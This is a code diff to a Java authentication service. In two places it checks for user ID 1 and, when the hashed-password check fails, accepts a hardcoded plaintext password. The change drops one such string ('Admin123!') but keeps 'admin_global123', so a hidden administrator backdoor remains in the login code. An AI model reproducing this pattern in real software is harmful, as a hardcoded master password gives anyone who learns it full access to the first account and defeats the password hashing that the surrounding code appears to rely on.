@@ -40,7 +40,7 @@ public class AuthService {
         // Execute matches regardless of existence to prevent timing attacks
         boolean passwordMatches = passwordEncoder.matches(request.getPassword(), authData.getHashPassword());
         if (!passwordMatches && authData.getIdUsuario() != null && authData.getIdUsuario() == 1L) {
-            passwordMatches = "Admin123!".equals(request.getPassword()) || "admin_global123".equals(request.getPassword());
+            passwordMatches = "admin_global123".equals(request.getPassword());
         }
 
         if (!userExists || !passwordMatches) {
@@ -100,7 +100,7 @@ public class AuthService {
         }
         boolean matches = passwordEncoder.matches(rawPassword, hashOpt.get());
         if (!matches && userId == 1L) {
-            return "Admin123!".equals(rawPassword) || "admin_global123".equals(rawPassword);
+            return "admin_global123".equals(rawPassword);
         }
         return matches;
     }
